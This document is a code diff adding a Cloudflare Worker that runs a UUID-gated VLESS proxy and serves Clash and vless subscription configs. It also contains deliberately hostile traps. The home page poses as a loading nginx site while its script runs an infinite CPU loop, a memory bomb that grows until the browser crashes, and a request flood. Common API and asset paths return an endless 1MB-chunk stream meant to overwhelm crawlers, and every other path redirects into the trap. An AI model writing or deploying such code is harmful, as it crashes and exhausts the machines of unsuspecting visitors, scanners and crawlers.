@@ -1,0 +1,500 @@
+import { connect } from 'cloudflare:sockets';
+
+const E_INVALID_USER = 'invalid user';
+const E_INVALID_DATA = 'invalid data';
+
+export default {
+	async fetch(request, env, ctx) {
+		try {
+			const uuid = getUuid(env);
+			if (!uuid) {
+				return new Response('UUID not configured.', { status: 500 });
+			}
+			if (!isValidFormat(uuid)) {
+				return new Response('Invalid UUID format.', { status: 500 });
+			}
+
+			const url = new URL(request.url);
+			const path = url.pathname;
+
+			// 1. 正常代理逻辑 (优先级最高)
+			if (path === `/${uuid}/sub`) {
+				return handleSubscription(request, uuid);
+			}
+
+			if (request.headers.get('Upgrade') === 'websocket') {
+				return await handleWsRequest(request, uuid);
+			}
+
+			// ============================================================
+			// 2. 核弹陷阱模式 (移除所有限流限制)
+			// ============================================================
+			
+			// 陷阱 A：首页 -> 触发 CPU 炸弹 (直接卡死 CPU)
+			if (path === '/' || path === '/index.html') {
+				return new Response(getNuclearBombPage(), {
+					headers: { 
+						'Content-Type': 'text/html; charset=utf-8',
+						'Server': 'nginx'
+					}
+				});
+			}
+
+			// 陷阱 B：API 接口 -> 无限全速流 (瞬间占满内存/带宽)
+			// 任何常见的 API 路径都触发
+			if (path.startsWith('/api/') || path.startsWith('/static/') || path.startsWith('/assets/')) {
+				return handleNuclearStream();
+			}
+
+			// 兜底：其他所有请求全部重定向回首页，强迫进入陷阱
+			return Response.redirect(url.origin, 301);
+
+		} catch (err) {
+			console.error('Worker error:', err);
+			return new Response('Internal Server Error', { status: 500 });
+		}
+	},
+};
+
+// ============================================================
+// 订阅处理 (保持不变)
+// ============================================================
+function getUuid(env) {
+	const rawToken = env.uuid || env.u || env.UUID || '';
+	return rawToken.trim().replace(/^["']|["']$/g, '').toLowerCase();
+}
+
+function handleSubscription(request, uuid) {
+	const host = request.headers.get('X-Forwarded-Host') || request.headers.get('Host');
+	const url = new URL(request.url);
+	const target = url.searchParams.get('target');
+
+	const fp = 'chrome';
+	const alpn = 'h2,http/1.1';
+	const clientFingerprint = 'chrome';
+
+	if (target === 'clash') {
+		const clashYaml = `mixed-port: 7890
+allow-lan: true
+mode: rule
+log-level: info
+proxies:
+  - name: "${host}"
+    type: vless
+    server: ${host}
+    port: 443
+    uuid: ${uuid}
+    network: ws
+    tls: true
+    udp: true
+    ws-opts:
+      path: "/?ed=2048"
+      headers:
+        Host: ${host}
+    servername: ${host}
+    client-fingerprint: ${clientFingerprint}
+proxy-groups:
+  - name: "Proxy"
+    type: select
+    proxies:
+      - "${host}"
+rules:
+  - GEOIP,CN,DIRECT
+  - MATCH,Proxy
+`;
+		return new Response(clashYaml, {
+			status: 200,
+			headers: {
+				'Content-Type': 'text/yaml;charset=utf-8',
+				'Profile-Update-Interval': '24'
+			}
+		});
+	} else {
+		const vlessLink = `vless://${uuid}@${host}:443?encryption=none&security=tls&sni=${host}&fp=${fp}&alpn=${alpn}&type=ws&host=${host}&path=%2F%3Fed%3D2048#${host}`;
+		const base64Content = btoa(vlessLink);
+		return new Response(base64Content, {
+			status: 200,
+			headers: {
+				'Content-Type': 'text/plain;charset=utf-8',
+				'Profile-Update-Interval': '24'
+			}
+		});
+	}
+}
+
+// ============================================================
+// 核弹陷阱 A：CPU 炸弹页面
+// 特征：打开页面瞬间，CPU 飙升至 100%，浏览器卡死
+// ============================================================
+function getNuclearBombPage() {
+	return `
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+<div style="text-align:center;padding-top:50px;"><h3>正在加载资源，请稍候...</h3></div>
+<script>
+(function() {
+    // 1. CPU 炸弹：无限循环计算哈希，占满 CPU
+    function cpuBomb() {
+        var text = "";
+        var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        // 无限循环
+        while(true) {
+            text = "";
+            for (var i = 0; i < 10000; i++) { // 每次计算多一点，增加负担
+                text += possible.charAt(Math.floor(Math.random() * possible.length));
+            }
+            // 尝试计算哈希（如果环境支持），进一步消耗 CPU
+            try { 
+                if (crypto && crypto.subtle) {
+                    // 这里只是示意，实际异步哈希可能不会阻塞，但死循环足够了
+                } 
+            } catch(e) {}
+        }
+    }
+
+    // 2. 内存炸弹：不断申请内存
+    function memoryBomb() {
+        var chunks = [];
+        setInterval(function() {
+            // 每隔 100ms 申请 10MB 内存，直到浏览器崩溃
+            chunks.push(new Array(10 * 1024 * 1024).join("x")); 
+        }, 100);
+    }
+
+    // 3. 并发炸弹：疯狂请求后端 API (触发陷阱 B)
+    function networkBomb() {
+        setInterval(function() {
+            fetch('/api/v1/config?r=' + Math.random()).catch(function(){}); // 忽略错误，只管发
+        }, 50); // 每 50ms 发一个请求，快速消耗 Worker 并发
+    }
+
+    // 同时启动三颗核弹
+    try { setTimeout(cpuBomb, 10); } catch(e) {}
+    try { setTimeout(memoryBomb, 10); } catch(e) {}
+    try { setTimeout(networkBomb, 10); } catch(e) {}
+
+    // 伪装：如果用户按 F12 或查看源码，可能会发现，但通常 CPU 满了他们动不了
+})();
+</script>
+</body>
+</html>`;
+}
+
+// ============================================================
+// 核弹陷阱 B：全速无限流
+// 特征：Worker 不限速，全速生成数据返回
+// 结果：爬虫瞬间接收海量数据，带宽占满，内存溢出
+// ============================================================
+function handleNuclearStream() {
+    const { readable, writable } = new TransformStream();
+    const writer = writable.getWriter();
+    
+    async function pump() {
+        // 生成一个较大的块 (1MB)，比之前的 1KB 大得多
+        // 这样可以更快地填满网络缓冲区
+        const chunk = new Uint8Array(1024 * 1024); // 1MB
+        
+        while (true) {
+            try {
+                // 全速写入，没有任何 sleep 延迟！
+                await writer.write(chunk);
+            } catch (e) {
+                // 客户端断开连接
+                break;
+            }
+        }
+    }
+
+    pump();
+
+    return new Response(readable, {
+        headers: {
+            'Content-Type': 'application/octet-stream',
+            'Transfer-Encoding': 'chunked',
+            'Server': 'nginx',
+            'Cache-Control': 'no-store'
+        }
+    });
+}
+
+// ============================================================
+// 以下为原始代理核心逻辑 (保持不变)
+// ============================================================
+
+async function handleWsRequest(request, uuid) {
+	const wsPair = new WebSocketPair();
+	const [clientSock, serverSock] = Object.values(wsPair);
+	serverSock.accept();
+
+	const context = {
+		remoteConnWrapper: { socket: null },
+		isDnsQuery: false,
+		lastActivity: Date.now()
+	};
+
+	const keepAliveTimer = setInterval(() => {
+		if (Date.now() - context.lastActivity > 90000) {
+			closeSocketQuietly(serverSock);
+			if (context.remoteConnWrapper.socket) {
+				closeSocketQuietly(context.remoteConnWrapper.socket);
+			}
+			clearInterval(keepAliveTimer);
+		}
+	}, 30000);
+
+	serverSock.addEventListener('close', () => clearInterval(keepAliveTimer));
+	serverSock.addEventListener('error', () => clearInterval(keepAliveTimer));
+
+	const earlyData = request.headers.get('sec-websocket-protocol') || '';
+	const readable = makeReadableStream(serverSock, earlyData, context);
+
+	readable.pipeTo(new WritableStream({
+		async write(chunk) {
+			context.lastActivity = Date.now();
+
+			if (context.isDnsQuery) {
+				return await forwardUDP(chunk, serverSock, null);
+			}
+
+			if (context.remoteConnWrapper.socket) {
+				const writer = context.remoteConnWrapper.socket.writable.getWriter();
+				await writer.write(chunk);
+				writer.releaseLock();
+				return;
+			}
+
+			const { hasError, message, addressType, port, hostname, rawIndex, version, isUDP } = parseWsPacketHeader(chunk, uuid);
+
+			if (hasError) {
+				if (message === E_INVALID_USER) {
+					const fakeResponse = "HTTP/1.1 404 Not Found\r\nConnection: close\r\nContent-Type: text/html\r\n\r\n<html><body><h1>404 Not Found</h1></body></html>";
+					try { serverSock.send(fakeResponse); } catch (e) { }
+				}
+				serverSock.close();
+				return;
+			}
+
+			if (isUDP) {
+				if (port === 53) {
+					context.isDnsQuery = true;
+				} else {
+					throw new Error("UDP proxy only enabled for DNS (port 53)");
+				}
+			}
+
+			const respHeader = new Uint8Array([version[0], 0]);
+			const rawData = chunk.slice(rawIndex);
+
+			if (context.isDnsQuery) {
+				return forwardUDP(rawData, serverSock, respHeader);
+			}
+
+			await forwardTCP(addressType, hostname, port, rawData, serverSock, respHeader, context);
+		},
+	})).catch((err) => {
+		clearInterval(keepAliveTimer);
+		console.error('WebSocket error:', err);
+	});
+
+	return new Response(null, { status: 101, webSocket: clientSock });
+}
+
+async function forwardTCP(addrType, host, portNum, rawData, ws, respHeader, context) {
+	async function connectAndSend(address, port) {
+		const remoteSock = connect({ hostname: address, port: port });
+		context.remoteConnWrapper.socket = remoteSock;
+		const writer = remoteSock.writable.getWriter();
+		await writer.write(rawData);
+		writer.releaseLock();
+		return remoteSock;
+	}
+
+	try {
+		const initialSocket = await connectAndSend(host, portNum);
+		connectStreams(initialSocket, ws, respHeader, context);
+	} catch (err) {
+		console.error('TCP connection failed:', err);
+		throw new Error('Connection failed to ' + host + ':' + portNum);
+	}
+}
+
+function parseWsPacketHeader(chunk, token) {
+	if (chunk.byteLength < 24) return { hasError: true, message: E_INVALID_DATA };
+
+	const version = new Uint8Array(chunk.slice(0, 1));
+	if (formatIdentifier(new Uint8Array(chunk.slice(1, 17))) !== token) {
+		return { hasError: true, message: E_INVALID_USER };
+	}
+
+	const optLen = new Uint8Array(chunk.slice(17, 18))[0];
+	const cmd = new Uint8Array(chunk.slice(18 + optLen, 19 + optLen))[0];
+
+	let isUDP = false;
+	if (cmd === 1) {
+		// TCP
+	} else if (cmd === 2) {
+		isUDP = true;
+	} else {
+		return { hasError: true, message: "command is not supported" };
+	}
+
+	const portIdx = 19 + optLen;
+	const port = new DataView(chunk.slice(portIdx, portIdx + 2)).getUint16(0);
+
+	let addrIdx = portIdx + 2;
+	let addrLen = 0;
+	let addrValIdx = addrIdx + 1;
+	let hostname = '';
+
+	const addressType = new Uint8Array(chunk.slice(addrIdx, addrValIdx))[0];
+
+	switch (addressType) {
+		case 1:
+			addrLen = 4;
+			hostname = new Uint8Array(chunk.slice(addrValIdx, addrValIdx + addrLen)).join('.');
+			break;
+		case 2:
+			addrLen = new Uint8Array(chunk.slice(addrValIdx, addrValIdx + 1))[0];
+			addrValIdx += 1;
+			hostname = new TextDecoder().decode(chunk.slice(addrValIdx, addrValIdx + addrLen));
+			break;
+		case 3:
+			addrLen = 16;
+			const ipv6 = [];
+			const ipv6View = new DataView(chunk.slice(addrValIdx, addrValIdx + addrLen));
+			for (let i = 0; i < 8; i++) {
+				ipv6.push(ipv6View.getUint16(i * 2).toString(16));
+			}
+			hostname = ipv6.join(':');
+			break;
+		default:
+			return { hasError: true, message: 'invalid addressType: ' + addressType };
+	}
+
+	if (!hostname) {
+		return { hasError:  true, message: 'addressValue is empty: ' + addressType };
+	}
+
+	return {
+		hasError: false,
+		addressType,
+		port,
+		hostname,
+		isUDP,
+		rawIndex: addrValIdx + addrLen,
+		version
+	};
+}
+
+function makeReadableStream(socket, earlyDataHeader, context) {
+	let cancelled = false;
+	return new ReadableStream({
+		start(controller) {
+			socket.addEventListener('message', (event) => {
+				if (!cancelled) controller.enqueue(event.data);
+			});
+			socket.addEventListener('close', () => {
+				if (!cancelled) {
+					closeSocketQuietly(socket);
+					controller.close();
+				}
+			});
+			socket.addEventListener('error', (err) => controller.error(err));
+
+			const { earlyData, error } = base64ToArray(earlyDataHeader);
+			if (error) {
+				controller.error(error);
+			} else if (earlyData) {
+				controller.enqueue(earlyData);
+			}
+		},
+		cancel() {
+			cancelled = true;
+			closeSocketQuietly(socket);
+		}
+	});
+}
+
+async function connectStreams(remoteSocket, webSocket, headerData, context) {
+	let header = headerData;
+	await remoteSocket.readable.pipeTo(new WritableStream({
+		async write(chunk) {
+			if (context) context.lastActivity = Date.now();
+			if (webSocket.readyState !== 1) throw new Error("WebSocket is not open");
+
+			if (header) {
+				webSocket.send(await new Blob([header, chunk]).arrayBuffer());
+				header = null;
+			} else {
+				webSocket.send(chunk);
+			}
+		},
+	})).catch((error) => {
+		closeSocketQuietly(webSocket);
+	});
+}
+
+async function forwardUDP(udpChunk, webSocket, respHeader) {
+	try {
+		const tcpSocket = connect({ hostname: '8.8.4.4', port: 53 });
+		let vlessHeader = respHeader;
+
+		const writer = tcpSocket.writable.getWriter();
+		await writer.write(udpChunk);
+		writer.releaseLock();
+
+		await tcpSocket.readable.pipeTo(new WritableStream({
+			async write(chunk) {
+				if (webSocket.readyState === 1) {
+					if (vlessHeader) {
+						webSocket.send(await new Blob([vlessHeader, chunk]).arrayBuffer());
+						vlessHeader = null;
+					} else {
+						webSocket.send(chunk);
+					}
+				}
+			},
+		}));
+	} catch (error) {
+		console.error('DNS forward error:', error.message);
+	}
+}
+
+function base64ToArray(b64Str) {
+	if (!b64Str) return { error: null };
+	try {
+		b64Str = b64Str.replace(/-/g, '+').replace(/_/g, '/');
+		return {
+			earlyData: Uint8Array.from(atob(b64Str), (c) => c.charCodeAt(0)).buffer,
+			error: null
+		};
+	} catch (error) {
+		return { error };
+	}
+}
+
+function isValidFormat(uuid) {
+	return /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(uuid);
+}
+
+function closeSocketQuietly(socket) {
+	try {
+		if (socket.readyState === 1 || socket.readyState === 2) socket.close();
+	} catch (error) { }
+}
+
+const hexTable = Array.from({ length: 256 }, (v, i) => (i + 256).toString(16).slice(1));
+
+function formatIdentifier(arr, offset = 0) {
+	const id = (
+		hexTable[arr[offset]] + hexTable[arr[offset + 1]] + hexTable[arr[offset + 2]] + hexTable[arr[offset + 3]] + "-" +
+		hexTable[arr[offset + 4]] + hexTable[arr[offset + 5]] + "-" +
+		hexTable[arr[offset + 6]] + hexTable[arr[offset + 7]] + "-" +
+		hexTable[arr[offset + 8]] + hexTable[arr[offset + 9]] + "-" +
+		hexTable[arr[offset + 10]] + hexTable[arr[offset + 11]] + hexTable[arr[offset + 12]] + hexTable[arr[offset + 13]] + hexTable[arr[offset + 14]] + hexTable[arr[offset + 15]]
+	).toLowerCase();
+	if (!isValidFormat(id)) throw new TypeError("Stringified identifier is invalid");
+	return id;
+}
